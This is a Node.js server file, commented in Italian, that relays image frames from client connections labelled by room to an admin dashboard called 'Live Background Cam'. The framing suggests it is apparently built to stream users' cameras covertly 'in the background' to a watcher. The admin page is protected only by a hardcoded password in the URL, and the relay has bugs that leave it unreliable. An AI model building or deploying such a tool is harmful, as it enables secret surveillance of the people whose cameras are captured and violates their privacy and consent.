const express = require('express');
const ws = require('ws');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Servi pagina utente
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Dashboard admin con password
app.get('/admin', (req, res) => {
  if (req.query.pass !== 'secret123') {
    return res.status(403).send('Accesso negato');
  }
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// === ADMIN DASHBOARD (admin.html) ===
const adminHtml = `
<!DOCTYPE html>
<html><head><title>Live Background Cam</title>
<style>
  body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:15px; }
  .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; }
  img { width:100%; height:auto; display:block; }
  h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
  .status { color:#0f0; font-size:12px; text-align:center; padding:4px; }
</style></head>
<body>
  <h1>Camera in Background</h1>
  <div id="grid" class="grid"></div>
  <script>
    const grid = document.getElementById('grid');
    const ws = new WebSocket('wss://' + location.host + '/bg-admin');
    const rooms = new Map();

    ws.onmessage = (e) => {
      try {
        if (e.data instanceof Blob) {
          // Gestisce il blob dell'immagine
          const lastRoom = localStorage.getItem('lastRoom');
          if (lastRoom) {
            const img = document.getElementById('img-' + lastRoom);
            if (img) {
              // Rilascia l'URL precedente per evitare memory leak
              if (img.src) {
                URL.revokeObjectURL(img.src);
              }
              // Crea nuovo URL per il nuovo frame
              const blobUrl = URL.createObjectURL(e.data);
              img.src = blobUrl;
              document.getElementById('status-' + lastRoom).textContent = 'Live';
              
              // Imposta un timeout per rimuovere l'URL dopo che l'immagine è caricata
              img.onload = () => {
                setTimeout(() => {
                  URL.revokeObjectURL(blobUrl);
                }, 100);
              };
            }
          }
        } else {
          // Gestisce i metadati (room, timestamp)
          const { room, timestamp } = JSON.parse(e.data);
          localStorage.setItem('lastRoom', room);
          if (!rooms.has(room)) {
            const div = document.createElement('div');
            div.className = 'cam';
            div.innerHTML = \`
              <h2>\${room}</h2>
              <img id="img-\${room}">
              <div class="status" id="status-\${room}">Online</div>
            \`;
            grid.appendChild(div);
            rooms.set(room, div);
          }
          // Aggiorna lo stato per mostrare l'ultimo timestamp
          const statusEl = document.getElementById('status-' + room);
          if (statusEl) {
            const date = new Date(timestamp);
            statusEl.textContent = 'Live - ' + date.toLocaleTimeString();
          }
        }
      } catch(err) {
        console.error('Error processing message:', err);
      }
    };
  </script>
</body></html>
`;

// Salva admin.html dinamicamente
const fs = require('fs');
fs.writeFileSync('admin.html', adminHtml);

app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

// === WEBSOCKET: Streaming in background ===
const bgWss = new ws.Server({ noServer: true });
const adminWss = new ws.Server({ noServer: true });

const clients = new Map(); // room → ws

bgWss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const room = url.searchParams.get('room') || 'unknown';

  clients.set(room, ws);

  ws.on('message', (data) => {
    if (typeof data === 'string' && data === 'ping') return;

    const msg = JSON.stringify({ room, timestamp: Date.now() });

    // Invia a tutti gli admin
    adminWss.clients.forEach(client => {
      if (client.readyState === ws.OPEN) {
        client.send(msg, { binary: true });
        if (data instanceof Blob || data.byteLength) {
          client.send(data);
        }
      }
    });
  });

  ws.on('close', () => {
    clients.delete(room);
    // Notifica admin che è offline
    adminWss.clients.forEach(c => {
      if (c.readyState === ws.OPEN) {
        c.send(JSON.stringify({ room, offline: true }));
      }
    });
  });
});

// Admin si connette qui
adminWss.on('connection', (ws) => {
  ws.send(JSON.stringify({ type: 'welcome' }));
});

const server = app.listen(PORT, () => {
  console.log(`Server: https://localhost:${PORT}`);
});

server.on('upgrade', (req, socket, head) => {
  const pathname = new URL(req.url, `http://${req.headers.host}`).pathname;

  if (pathname === '/bg-stream') {
    bgWss.handleUpgrade(req, socket, head, ws => {
      bgWss.emit('connection', ws, req);
    });
  } else if (pathname === '/bg-admin') {
    adminWss.handleUpgrade(req, socket, head, ws => {
      adminWss.emit('connection', ws, req);
    });
  } else {
    socket.destroy();
  }
});